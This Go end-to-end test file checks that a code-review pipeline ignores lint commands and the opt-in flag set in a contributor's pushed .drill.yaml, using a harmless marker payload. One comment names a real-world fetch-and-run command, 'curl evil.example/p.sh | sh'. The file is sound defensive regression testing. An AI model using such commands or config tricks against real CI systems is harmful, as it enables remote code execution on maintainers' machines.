//go:build e2e

package e2e

import (
	"strings"
	"testing"
	"time"

	"github.com/runecraftai/squad/packages/drill/internal/types"
)

// repoCommandOutput is produced only when the pushed-branch lint command runs:
// the payload computes it, so the literal text in the config never matches.
const repoCommandOutput = "rce-42"

const repoCommandPayload = "commands:\n  lint: 'printf rce-$((6*7))'\n"

// TestRepoConfigCommandsFromDefaultBranch proves the supply-chain RCE fix
// (audit finding #1): the code-executing fields commands.* are loaded from the
// trusted default-branch copy of .drill.yaml, never from a contributor's
// pushed SHA. A feature branch ships a malicious lint command whose output
// marks execution; the secure default must ignore it, while an explicit
// allow_repo_commands opt-in must run it.
func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
	t.Run("blocked_by_default", func(t *testing.T) {
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		pushMaliciousRepoConfig(t, h, "rce-blocked")

		run := h.WaitForRun("rce-blocked", 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
		}

		if repoCommandExecuted(t, h) {
			t.Fatal("SECURITY REGRESSION: pushed-branch lint command executed (its output appeared in the lint step); commands.* must be loaded from the trusted default branch, not the pushed SHA")
		}

		// Sanity: the lint step ran (it delegated to the agent because the
		// trusted default branch has no lint command) and reached a terminal
		// status, so the absence of the output is a real result rather than a
		// pipeline that never got to lint.
		lintStep, ok := findStep(run.Steps, types.StepLint)
		if !ok {
			t.Fatalf("lint step missing from run results")
		}
		switch lintStep.Status {
		case types.StepStatusCompleted, types.StepStatusSkipped, types.StepStatusFailed:
		default:
			t.Fatalf("lint step did not reach a terminal status: %s", lintStep.Status)
		}
	})

	t.Run("executes_when_opted_in", func(t *testing.T) {
		// Same attack payload, but the maintainer has explicitly opted in via
		// allow_repo_commands. The pushed-branch command MUST run, proving the
		// output check above is a meaningful guard against regressions.
		optIn := true
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optIn})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		pushMaliciousRepoConfig(t, h, "rce-optin")

		run := h.WaitForRun("rce-optin", 90*time.Second)
		// The opt-in run may complete or fail depending on later steps; either
		// way the lint payload must have executed. Guard with a clear message.
		if !repoCommandExecuted(t, h) {
			t.Fatalf("opt-in run should have executed the pushed-branch lint command (output %q missing from lint step); run status=%s err=%v", repoCommandOutput, run.Status, deref(run.Error))
		}
	})

	t.Run("pushed_branch_cannot_self_enable", func(t *testing.T) {
		// Hard requirement of the per-repo move: allow_repo_commands is read
		// ONLY from the trusted default-branch copy, never the pushed SHA. A
		// contributor who sets allow_repo_commands: true on their feature
		// branch alongside a hostile command MUST NOT self-enable — the
		// trusted default branch says false, so the command is dropped.
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		branch := "rce-self-enable"
		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
		// The contributor tries to flip the opt-in on AND ship a hostile
		// command in the same pushed copy. Both must be ignored: the trusted
		// default-branch copy controls the switch.
		selfEnableConfig := "ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\n" + repoCommandPayload
		h.CommitChange(branch, ".drill.yaml", selfEnableConfig, "self-enable + malicious lint")
		h.PushToGate(branch)

		run := h.WaitForRun(branch, 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
		}

		if repoCommandExecuted(t, h) {
			t.Fatal("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (its output appeared in the lint step); the opt-in must be read from the trusted default branch, not the pushed SHA")
		}
	})
}

// pushMaliciousRepoConfig creates a feature branch carrying a hostile
// .drill.yaml whose lint command prints repoCommandOutput only when executed,
// and pushes it through the gate. The default-branch .drill.yaml carries no
// commands, so it is the trusted source.
func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) {
	t.Helper()

	// A real change so rebase has a non-empty diff.
	h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")

	// The malicious payload: in the wild this would be
	// "curl evil.example/p.sh | sh". Here it prints an output marker.
	h.CommitChange(branch, ".drill.yaml", "ignore_patterns:\n  - 'vendor/**'\n"+repoCommandPayload, "configure malicious lint command")

	h.PushToGate(branch)
}

// repoCommandExecuted reports whether the lint step captured the payload's
// output, which only happens when the pushed-branch command actually ran.
func repoCommandExecuted(t *testing.T, h *Harness) bool {
	t.Helper()
	out, err := h.Run("axi", "logs", "--step", "lint", "--full")
	if err != nil {
		t.Fatalf("read lint step output: %v\n%s", err, out)
	}
	return strings.Contains(out, repoCommandOutput)
}
